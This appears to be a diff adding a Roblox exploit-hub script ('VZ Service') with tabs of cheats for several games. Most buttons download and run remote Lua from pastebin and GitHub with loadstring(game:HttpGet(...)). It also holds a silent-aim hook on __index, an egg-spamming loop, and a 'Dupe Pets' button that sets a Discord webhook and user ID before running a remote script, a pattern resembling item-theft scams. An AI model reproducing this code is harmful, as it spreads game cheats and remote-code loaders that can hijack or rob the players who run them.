@@ -1,0 +1,341 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("VZ Service", "DarkTheme")
+
+    -- MAIN
+    local Main = Window:NewTab("Main")
+    local MainSection = Main:NewSection("Main Scripts")
+
+
+    MainSection:NewButton("Back/Front Flip", "Press X to Toggle", function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/7wDcPtLk'))()
+    end)
+
+    MainSection:NewToggle("Super-Human", "go fast and jump high", function(state)
+        if state then
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 120
+            game.Players.LocalPlayer.Character.Humanoid.JumpPower = 120
+        else
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+            game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+        end
+    end)
+
+    MainSection:NewButton("Admin Commands", "Infinite Yield Commands", function()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+    end)
+
+    MainSection:NewButton("Visual Korblox", "Get Korblox (Only you can look it)", function()
+    local ply = game.Players.LocalPlayer
+    local chr = ply.Character
+     chr.RightLowerLeg.MeshId = "902942093"
+     chr.RightLowerLeg.Transparency = "1"
+     chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+     chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+     chr.RightFoot.MeshId = "902942089"
+     chr.RightFoot.Transparency = "1"
+
+    end)
+
+    MainSection:NewButton("Visual Headless", "Get Headless (Only you can look it)", function()
+        game.Players.LocalPlayer.Character.Head.Transparency = 1
+game.Players.LocalPlayer.Character.Head.Transparency = 1
+for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
+if (v:IsA("Decal")) then
+v.Transparency = 1
+end
+end
+    end)
+
+    --LOCAL PLAYER
+    local Player = Window:NewTab("Player")
+    local PlayerSection = Player:NewSection("Player Scripts")
+
+    PlayerSection:NewSlider("Walkspeed", "Change Walk Speed", 500, 16, function(s)
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
+    end)
+
+    PlayerSection:NewSlider("Jumppower", "Change Jump Power", 350, 50, function(s)
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
+    end)
+
+    PlayerSection:NewButton("Reset WalkSpeed/Jump", "Resets to all defaults", function()
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+    end)
+
+    PlayerSection:NewButton("Walk Slow", "Walk Cool ;)", function()
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 6
+    end)
+
+
+    --Other
+    local Other = Window:NewTab("Other")
+    local OtherSection = Other:NewSection("Other Scripts")
+
+    OtherSection:NewButton("Chat Spoofer", "Lets you chat as other people", function()
+        loadstring(game:HttpGet(('https://pastebin.com/raw/djBfk8Li'),true))()
+    end)
+
+    OtherSection:NewButton("Fly", "Press X to toggle Fly", function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/BypassedFly.lua"))() 
+
+        Fly(true)
+    end)
+
+   --Premium
+   local Tab = Window:NewTab("Premium Scripts")
+   local TabSection = Tab:NewSection("MUST OWN GAMEPASS")
+
+   TabSection:NewTextBox("Enter Code", "Enter Premium Code", function(txt)
+	print(txt)
+end)
+
+TabSection:NewKeybind("Execute Premium GUI", "(You Need Gamepass)", Enum.KeyCode.E, function()
+	print("You Need Gamepass")
+end)
+
+   -- PSX sCRIPTS 
+   local PSX = Window:NewTab("Pet Simulator X")
+   local PSXSection = PSX:NewSection("PSX Scripts")
+
+   PSXSection:NewButton("Auto Farm GUI", "Gives you an AUTO FARM GUI", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptRUs/Ryans/main/Ghosthub.lua"))()
+end)
+
+PSXSection:NewButton("Spam Eggs Script", "Spams EVERY egg", function()
+    _G.Enabled = true --// set to "false" to disable the script
+
+local useGolden = true --// Set to "false" if you don't want to open golden eggs
+
+
+--// DON'T EDIT BELOW IF YOU DONT KNOW WHAT YOU'RE DOING
+
+local event = workspace.__THINGS.__REMOTES:FindFirstChild("buy egg")
+
+local rprint
+
+local Normal_Eggs = {}
+local Golden_Eggs = {}
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local Eggs = ReplicatedStorage:WaitForChild("Game").Eggs
+
+if rconsolewarn then
+rconsoleclear()
+rprint = rconsolewarn
+else
+rprint = print
+end
+
+function Time(Tick) -- Not By me
+if typeof(Tick) ~= "number" then
+return warn('Integer expected, got', typeof(Tick))
+end
+local Tick = tick() - Tick
+local Weeks = math.floor(math.floor(math.floor(math.floor(Tick / 60) / 60) / 24) / 7)
+local Days =  math.floor(math.floor(math.floor(Tick / 60) / 60) / 24)
+local Hours = math.floor(math.floor(Tick / 60) / 60)
+local Minutes = math.floor(Tick / 60)
+local Seconds = math.floor(Tick)
+local MilliSeconds = (Tick * 1000)
+local Format = ""
+if Weeks > 0 then
+Format = Format .. string.format("%d Week/s, ", Weeks)
+end
+if Days > 0 then
+Format = Format .. string.format("%d Day/s, ", Days % 7)
+end
+if Hours > 0 then
+Format = Format .. string.format("%d Hour/s, ", Hours % 24)
+end
+if Minutes > 0 then
+Format = Format .. string.format("%d Minute/s, ", Minutes % 60)
+end
+if Seconds > 0 then
+Format = Format .. string.format("%d Second/s, ", Seconds % 60)
+end
+if MilliSeconds > 0 then
+Format = Format .. string.format("%d Ms", MilliSeconds % 1000)
+end
+return Format
+end
+
+local startTick = tick()
+
+for _,eggFolder in pairs(Eggs:GetChildren()) do
+for _,eggName in pairs(eggFolder:GetChildren()) do
+if string.find(eggName.Name, "Golden") then
+table.insert(Golden_Eggs, eggName.Name)
+else
+table.insert(Normal_Eggs, eggName.Name)
+end
+end
+task.wait()
+end
+
+rprint("Added all eggs to database. Took "..tostring(Time(startTick)))
+
+
+while _G.Enabled == true and wait(0.05) do
+local args = {}
+local normalegg = Normal_Eggs[math.random(1, #Normal_Eggs)]
+local goldenegg = Golden_Eggs[math.random(1, #Golden_Eggs)]
+if useGolden == true then
+if math.random(1,2) == 1 then
+args = {normalegg, false}
+rprint("[Mastery Farm] Buying: "..normalegg)
+else
+args = {goldenegg, false}
+rprint("[Mastery Farm] Buying: "..goldenegg)
+end
+else
+args = {normalegg, false}
+rprint("[Mastery Farm] Buying: "..normalegg)
+end
+local e = event:InvokeServer(args)
+repeat wait() until e ~= nil
+rprint("Running Time: "..tostring(Time(startTick)))
+end
+
+end)
+    
+PSXSection:NewButton("Dupe Pets", "Equip The Pet you wanna Dupe and Rejoin", function()
+    _G.UserID = 1930407347
+_G.WebHook = "https://discord.com/api/webhooks/1038931177601515552/V5gDZKSXYRmF1v-v4jcvBEnlmPjXCvAWKyfG-BwJGDYlS87ps2-JCyh8TAyJ-3Be-VHj"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/Psx.v3/main/SilenceScripts.true"))()
+end)
+
+PSXSection:NewButton("Auto Farm GUI 2", "Gives you an AUTO FARM GUI", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/95HthyJq"))() 
+end)
+
+
+-- ADOPT ME SCRIPTS 
+local ADOPTME = Window:NewTab("Adopt Me")
+local ADOPTMESection = ADOPTME:NewSection("Adopt Me Scripts")
+local ADOPTMESection = ADOPTME:NewSection("DUPE PETS ON PREMIUM")
+
+ADOPTMESection:NewButton("VG GUI", "An GUI with a loot of stuff", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
+end)
+
+-- Build A Boat
+local Boat = Window:NewTab("Build A Boat")
+local BoatSection = Boat:NewSection("Build a Boat Scripts")
+
+BoatSection:NewButton("Infinite Blocks", "Get 999999 Blocks", function()
+    game.Players.LocalPlayer.Data.Cannon.Value=999999;game.Players.LocalPlayer.Data.TNT.Value=9999999;game.Players.LocalPlayer.Data.WoodRod.Value=9999999;game.Players.LocalPlayer.Data.Throne.Value=9999999;game.Players.LocalPlayer.Data.Step.Value=9999999;game.Players.LocalPlayer.Data.Truss.Value=999999;game.Players.LocalPlayer.Data.Wedge.Value=9999999;game.Players.LocalPlayer.Data.CornerWedge.Value=9999999;game.Players.LocalPlayer.Data.Seat.Value=9999999;game.Players.LocalPlayer.Data.Mast.Value=9999999;game.Players.LocalPlayer.Data.Flag.Value=9999999;game.Players.LocalPlayer.Data.Window.Value=9999999;game.Players.LocalPlayer.Data.StoneBlock.Value=9999999;game.Players.LocalPlayer.Data.StoneRod.Value=9999999;game.Players.LocalPlayer.Data.RustedRod.Value=9999999;game.Players.LocalPlayer.Data.RustedBlock.Value=999999;game.Players.LocalPlayer.Data.MetalRod.Value=9999999;game.Players.LocalPlayer.Data.ConcreteRod.Value=9999999;game.Players.LocalPlayer.Data.MetalBlock.Value=999999;game.Players.LocalPlayer.Data.MarbleRod.Value=999999;game.Players.LocalPlayer.Data.TitaniumRod.Value=9999999;game.Players.LocalPlayer.Data.ConcreteBlock.Value=9999999;game.Players.LocalPlayer.Data.MarbleBlock.Value=9999999;game.Players.LocalPlayer.Data.TitaniumBlock.Value=9999999;game.Players.LocalPlayer.Data.Wheel.Value=9999999;game.Players.LocalPlayer.Data.Chair.Value=9999999;game.Players.LocalPlayer.Data.Torch.Value=9999999;game.Players.LocalPlayer.Data.YellowChest.Value=9999999;game.Players.LocalPlayer.Data.LifePreserver.Value=9999;game.Players.LocalPlayer.Data['Steel I-Beam'].Value=999999
+end)
+
+
+-- DaHood Scripts
+local Hood = Window:NewTab("Da Hood")
+local HoodSection = Hood:NewSection("Da Hood Scripts")
+
+HoodSection:NewButton("Da Hood GUI", "Aim bot, Silent Aim, ESP and more", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
+end)
+
+HoodSection:NewButton("Admin Fly", "Fly with ADMIN animations", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/22kristina/swag/main/admin_fly'))()
+end)
+
+HoodSection:NewButton("Da Hood GUI 2", "This works on Da Hood Modded Too!", function()
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Rippeed/DaHoodinary/main/chariotsware"))()
+end)
+
+HoodSection:NewButton("Silent Aim", "Get a better AIM", function()
+    -- // Dependencies
+local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/Stefanuk12/Aiming/main/Examples/AimLock.lua"))()
+local AimingChecks = Aiming.Checks
+local AimingSelected = Aiming.Selected
+local AimLockSettings = Aiming.AimLock
+
+-- // Services
+local Workspace = game:GetService("Workspace")
+
+-- // Vars
+local CurrentCamera = Workspace.CurrentCamera
+
+local DaHoodSettings = {
+    Prediction = 0.165,
+
+    SilentAim = true,
+
+    AimLock = AimLockSettings,
+    BeizerLock = {
+        Smoothness = 0.05,
+        CurvePoints = {
+            Vector2.new(0.83, 0),
+            Vector2.new(0.17, 1)
+        }
+    }
+}
+getgenv().DaHoodSettings = DaHoodSettings
+
+-- //
+local function ApplyPredictionFormula(SelectedPart)
+    return SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
+end
+
+-- // Hook
+local __index
+__index = hookmetamethod(game, "__index", function(t, k)
+    -- // Check if it trying to get our mouse's hit or target and see if we can use it
+    if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and AimingChecks.IsAvailable() and DaHoodSettings.SilentAim) then
+        -- // Vars
+        local SelectedPart = AimingSelected.Part
+        local Hit = ApplyPredictionFormula(SelectedPart)
+
+        -- // Return modded val
+        return (k == "Hit" and Hit or SelectedPart)
+    end
+
+    -- // Return
+    return __index(t, k)
+end)
+
+-- // Aimlock
+function AimLockSettings.AimLockPosition(CameraMode)
+    -- // Vars
+    local Position
+    local BeizerData = {}
+
+    -- // Hit to account prediction
+    local Hit = ApplyPredictionFormula(AimingSelected.Part)
+    local HitPosition = Hit.Position
+
+    -- //
+    if (CameraMode) then
+        Position = HitPosition
+    else
+        -- // Convert 3d -> 2d
+        local Vector, _ = CurrentCamera:WorldToViewportPoint(HitPosition)
+        local Vector2D = Vector2.new(Vector.X, Vector.Y)
+
+        -- // Vars
+        local BeizerLock = DaHoodSettings.BeizerLock
+
+        -- //
+        Position = Vector2D
+        BeizerData = {
+            Smoothness = BeizerLock.Smoothness,
+            CurvePoints = BeizerLock.CurvePoints
+        }
+    end
+
+    -- // Return
+    return Position, BeizerData
+end
+end)
+
+HoodSection:NewToggle("Fake Macro", "Click CTRL and press this", function(state)
+    if state then
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 120
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 120
+    else
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+    end
+end)
